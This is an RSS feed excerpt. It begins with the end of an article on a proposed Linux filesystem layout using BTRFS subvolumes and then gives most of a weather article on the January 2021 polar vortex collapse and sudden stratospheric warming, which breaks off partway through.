<a href="https://systemd.io/BOOT_LOADER_SPECIFICATION/">systemd boot loader specification</a>.
Depending on whether the boot loader in use can read the OS partition, the
kernel may have to be copied there. The application needs to be aware of
snapshots and know which kernel/initrd combination boots what snapshot.</li>
  <li>update-alternatives in its current form with symlinks to <code>/etc</code>
does not work anymore as the <code>/usr</code> tree is not functional without
it. A replacement needs stay within <code>/usr</code> boundaries.</li>
  <li>In order to auto discover the actual OS, i.e. <code>/usr</code> tree, in case a system boots
up with empty config, the partitioning scheme has to adhere to the
<a href="https://systemd.io/DISCOVERABLE_PARTITIONS/">discoverable partition</a> specification.
A similar spec would be required for the case where the OS tree is actually
BTRFS subvolumes.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>A traditional Linux file system layout already carries the idea to
separate the OS, config and data. Actually storing those different
types of files in separate locations and limiting the scope of
package management was never implemented with all consequences.
Doing so would be a major task but still evolutionary step that makes
small systems simpler while retaining all flexiblity of today’s
systems. With the new layout, it’s possible to use the same
technology and (binary) packages for building traditional Linux
systems as well as new, compact systems for Edge/IoT, set-top boxes
or routers and container hosts and runtimes with very little effort.</p>

<h2 id="appendix">Appendix</h2>

<h3 id="volume-properties">Volume properties</h3>

<p>With the files separated and stored on BTRFS as outlined in this
article, the subvolumes resp partitions holding the content can have
different properties</p>

<table>
  <thead>
    <tr>
      <th>Category</th>
      <th>RW</th>
      <th>CoW</th>
      <th>Snapshot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>config</td>
      <td>no</td>
      <td>yes</td>
      <td>yes</td>
    </tr>
    <tr>
      <td>data</td>
      <td>yes</td>
      <td>no</td>
      <td>no</td>
    </tr>
    <tr>
      <td>boot</td>
      <td>no</td>
      <td>no</td>
      <td>no</td>
    </tr>
    <tr>
      <td>OS</td>
      <td>no</td>
      <td>yes</td>
      <td>yes</td>
    </tr>
  </tbody>
</table>

<p>The OS and config volumes can leverage copy-on-write benefits as
well as …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lnussel.github.io/2020/12/16/fslayout/">https://lnussel.github.io/2020/12/16/fslayout/</a></em></p>]]>
            </description>
            <link>https://lnussel.github.io/2020/12/16/fslayout/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713757</guid>
            <pubDate>Sun, 10 Jan 2021 11:48:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Polar Vortex collapse sequence has begun]]>
            </title>
            <description>
<![CDATA[
Score 255 | Comments 184 (<a href="https://news.ycombinator.com/item?id=25713704">thread link</a>) | @makepanic
<br/>
January 10, 2021 | https://www.severe-weather.eu/global-weather/polar-vortex-collapse-winter-weather-europe-united-states-2021-fa/ | <a href="https://web.archive.org/web/*/https://www.severe-weather.eu/global-weather/polar-vortex-collapse-winter-weather-europe-united-states-2021-fa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><strong>A Polar Vortex collapse sequence has begun in late December 2020, with a major Sudden Stratospheric Warming event on January 5th, 2021. We will look at the sequence of these events, and how they can change the weather in Europe and the United States in the coming weeks.</strong></p>
<p>The main “player” in these weather events, is of course the <strong>Polar Vortex</strong>. It connects the bottom of the atmosphere (our weather) with the stratosphere above it. A strong exchange of energy between these two layers can heavily disrupt the weather development across the Northern Hemisphere.</p>
<h5><span><strong>WHAT IS THE POLAR VORTEX?</strong></span></h5>
<p>Since knowledge is the key, we will do a quick recap of what exactly is the Polar Vortex.</p>
<p>All of the clouds (and the weather that we feel) are found in the lowest part of the atmosphere called the <span><strong>troposphere</strong></span>. It reaches up to around 8 km (5 miles) altitude over the polar regions and up to around 14-16 km (9-10 miles) over the tropics.</p>
<p>Above it, there is a much deeper layer called the <span><strong>stratosphere</strong></span>. This layer is around 30 km thick and is very dry. We can see the layers of the atmosphere on the image below, with the <span>stratosphere</span> in green hues, and the <span>troposphere</span> in blue at the bottom.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-stratosphere-weather-warming-atmospheric-layers.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-stratosphere-weather-warming-atmospheric-layers.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-stratosphere-weather-warming-atmospheric-layers.jpg" data-image-id="21664" data-title="polar-vortex-stratosphere-weather-warming-atmospheric-layers" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-stratosphere-weather-warming-atmospheric-layers.jpg-nggid0521664-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-stratosphere-weather-warming-atmospheric-layers" title="polar-vortex-stratosphere-weather-warming-atmospheric-layers" width="475" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20475%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-stratosphere-weather-warming-atmospheric-layers.jpg-nggid0521664-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>Every year as we head into autumn, the north pole starts to cool. But the atmosphere further south is still relatively warm as it is still receiving energy from the Sun. The north pole receives very little sunlight and thermal energy, cooling at a faster rate.</p>
<p>The reduction in temperature also means a gradual pressure drop over the north pole. In the stratosphere, the process is the same. As the temperature drops over the pole and the temperature difference towards the south increases, a low-pressure area starts to develop across the stratosphere.</p>
<p>The image below shows a typical example of the Polar Vortex at around 30km altitude (10mb level) in the middle stratosphere.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-over-north-pole-winter.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-over-north-pole-winter.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-over-north-pole-winter.jpg" data-image-id="21663" data-title="polar-vortex-over-north-pole-winter" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-over-north-pole-winter.jpg-nggid0521663-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-over-north-pole-winter" title="polar-vortex-over-north-pole-winter" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-over-north-pole-winter.jpg-nggid0521663-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>It is almost like a very large cyclone, covering the whole north pole, down to the mid-latitudes. The polar vortex is present at all levels, almost from the ground up. The image below shows the polar vortex at different altitudes. The closer to the ground we get, the more deformed it gets, due to the complex terrain and the many weather fronts and systems.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-winter-weather-warming-north-hemisphere.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-winter-weather-warming-north-hemisphere.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-winter-weather-warming-north-hemisphere.png" data-image-id="21666" data-title="polar-vortex-winter-weather-warming-north-hemisphere" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-winter-weather-warming-north-hemisphere.png-nggid0521666-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-winter-weather-warming-north-hemisphere" title="polar-vortex-winter-weather-warming-north-hemisphere" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-winter-weather-warming-north-hemisphere.png-nggid0521666-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>We produced a high-resolution video for you below, which very nicely shows the Polar Vortex spinning over the Northern Hemisphere. It covers the period from December 2020 to January 2021, made from NASA GEOS-5 data.</p>
<p>Video shows the 10mb level (30km altitude) potential vorticity parameter, which overly simplified means, that it shows the energy of the polar vortex. Be aware of how the energy is being taken away from the polar vortex by the invisible polar Anticyclones (having a different kind of power), spinning in the opposite direction.</p>


<h5><span><strong>SUDDEN STRATOSPHERIC WARMING</strong></span></h5>
<p>&nbsp;<br>
As a general reference, we usually look at the polar vortex in the stratosphere at the 10mb level. That is around 28-32km (17-20 miles) altitude. This is considered to be around the middle stratosphere, and thus a good representation of the general dynamics of the polar vortex.</p>
<p>The strength of the polar vortex is most often measured by the power of the winds inside it. Usually, this is done is by measuring the zonal (west to east) wind speeds around the polar circle (60°N latitude).</p>
<p>Below we have an analysis from the NASA monitoring system, where we can see a very interesting progression. In early December, the polar vortex was at a quite strong level, reaching 40m/s zonal wind speeds. Problems began towards the mid-month, and especially towards late December when the stratospheric warming began. All graphics below are at the 10mb level (~30km altitude).</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast.jpg" data-image-id="21665" data-title="polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast.jpg-nggid0521665-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast" title="polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-zonal-wind-forecast.jpg-nggid0521665-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>Below is an image from the video we showed you earlier in the article, and it shows a quite healthy polar vortex in early December. It has a nice shape and a healthy spinning core.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-early-december.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-early-december.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-early-december.png" data-image-id="21669" data-title="polar-vortex-splitting-weather-winter-united-states-europe-early-december" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-early-december.png-nggid0521669-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-early-december" title="polar-vortex-splitting-weather-winter-united-states-europe-early-december" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-early-december.png-nggid0521669-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Towards mid-December, the pressure from the North Pacific was rising, with an Anticyclonic presence there gaining strength. The anticyclonic circulation was slowly getting stronger, starting to drain some energy away from the polar vortex, and changing its shape.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-mid-december.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-mid-december.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-mid-december.png" data-image-id="21672" data-title="polar-vortex-splitting-weather-winter-united-states-europe-mid-december" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-mid-december.png-nggid0521672-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-mid-december" title="polar-vortex-splitting-weather-winter-united-states-europe-mid-december" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-mid-december.png-nggid0521672-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>By late December, the Pacific/East Asian Anticyclone became quite a force, now draining a lot of energy from the Polar Vortex and actually becoming visible.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-late-december.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-late-december.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-late-december.png" data-image-id="21670" data-title="polar-vortex-splitting-weather-winter-united-states-europe-late-december" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-late-december.png-nggid0521670-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-late-december" title="polar-vortex-splitting-weather-winter-united-states-europe-late-december" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-late-december.png-nggid0521670-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>At a similar time in late December, a warming sequence began, from Europe over into central Asia. It was starting to engulf the outside layers of the polar vortex. The cold-core of the polar vortex is still rather intact at this point, holding temperatures colder than -80°C in the center over Greenland.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-warming-start.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-warming-start.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-warming-start.png" data-image-id="21673" data-title="polar-vortex-splitting-weather-winter-united-states-europe-warming-start" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-warming-start.png-nggid0521673-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-warming-start" title="polar-vortex-splitting-weather-winter-united-states-europe-warming-start" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-warming-start.png-nggid0521673-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Just two days later, the warming wave reached a local peak over Siberia, with maximum temperatures in the wave reaching up to +5°C or higher.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming.png" data-image-id="21674" data-title="polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming.png-nggid0521674-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming" title="polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-peak-stratospheric-warming.png-nggid0521674-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>On January 5th, the preliminary date of the Sudden Stratospheric Warming event was marked, as the winds around the polar circle have reversed. We can see how massive and strong the Anticyclone has now become, pushing strongly against the polar vortex (bright white). Together with the warming wave, the strong Anticyclonic system has deformed the once circular polar vortex into a banana-shaped feature.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2021.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2021.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-january-2021.png" data-image-id="21668" data-title="polar-vortex-splitting-weather-winter-united-states-europe-january-2021" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2021.png-nggid0521668-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-january-2021" title="polar-vortex-splitting-weather-winter-united-states-europe-january-2021" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2021.png-nggid0521668-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The warming wave has crawled over the entire North Pole in the stratosphere, effectively splitting the cold-core of the polar vortex into two parts. One over North America and one over the European sector. At this point, this does not have much to do directly with the weather on the surface, as it is at 30km altitude, but we will get to weather effects soon.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event.png" data-image-id="21675" data-title="polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event.png-nggid0521675-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event" title="polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-major-warming-event.png-nggid0521675-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Looking quickly at the forecast, we can see that the stratospheric Anticyclone will hold stable and move further over the North Pole. It will continue pushing against the very broken polar vortex.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast.png" data-image-id="21671" data-title="polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast.png-nggid0521671-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast" title="polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-january-2021-forecast.png-nggid0521671-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>At this point, a new warming wave is also forecasted to start, which should temporarily prevent any quick reorganization and strengthening of the stratospheric circulation.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast.png" data-image-id="21676" data-title="polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast.png-nggid0521676-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast" title="polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-stratosphere-forecast.png-nggid0521676-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Taking a look at the <a href="https://ozonewatch.gsfc.nasa.gov/meteorology/NH.html">NASA</a> temperature analysis for the stratosphere, we can see the large temperature spike at the 10mb (30km) level, which is in the middle stratosphere. The second image shows the temperature analysis in the lower stratosphere at 50mb (20km) level, also having a very clear temperature spike.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis.jpg" data-image-id="21679" data-title="polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis.jpg-nggid0521679-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis" title="polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-middle-stratosphere-temperature-analysis.jpg-nggid0521679-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis.jpg" data-image-id="21678" data-title="polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis.jpg-nggid0521678-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis" title="polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-lower-stratosphere-temperature-analysis.jpg-nggid0521678-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>Looking even lower, we have the 150mb level, which is kinda the boundary or the “buffer zone” between the stratosphere and the troposphere. Here we can also see the temperature spike, meaning the warming event was fairly robust and fast.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis.jpg" data-image-id="21677" data-title="polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis.jpg-nggid0521677-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis" title="polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/polar-vortex-splitting-weather-winter-united-states-europe-buffer-zone-temperature-analysis.jpg-nggid0521677-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<h5><span><strong>HISTORICAL WEATHER, FOR THE FUTURE</strong></span></h5>
<p>&nbsp;<br>
Before looking closer at the weather forecasts and their relation to the polar vortex, we need to look at some historic examples of similar events. History can sometimes be the best teacher for the future, and in science, this can be true more often than not.</p>
<p>Below we have 2 images, which both are quite simple to read and understand. They show time from left to right, and altitude from bottom to top. Colors show the temperature anomaly, with red being warmer than normal and blue was colder than normal. We can nicely track the progress of stratospheric warming events over time and altitude.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event.png" data-image-id="21683" data-title="polar-vortex-splitting-weather-winter-united-states-europe-january-2004-ssw-event" data-description="" target="_self">
